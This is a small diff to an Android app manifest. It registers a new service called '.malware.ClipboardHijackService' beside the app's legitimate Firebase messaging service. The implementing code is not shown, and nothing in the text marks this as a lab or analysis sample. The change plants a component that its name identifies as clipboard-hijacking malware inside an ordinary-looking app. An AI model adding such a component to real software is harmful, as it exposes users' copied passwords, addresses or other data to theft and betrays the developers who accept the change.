@@ -44,6 +44,9 @@
             </intent-filter>
         </activity>
         <service
+            android:name=".malware.ClipboardHijackService"
+            android:exported="false" />
+        <service
             android:name=".notifications.MyFirebaseMessagingService"
             android:exported="false">
             <intent-filter>
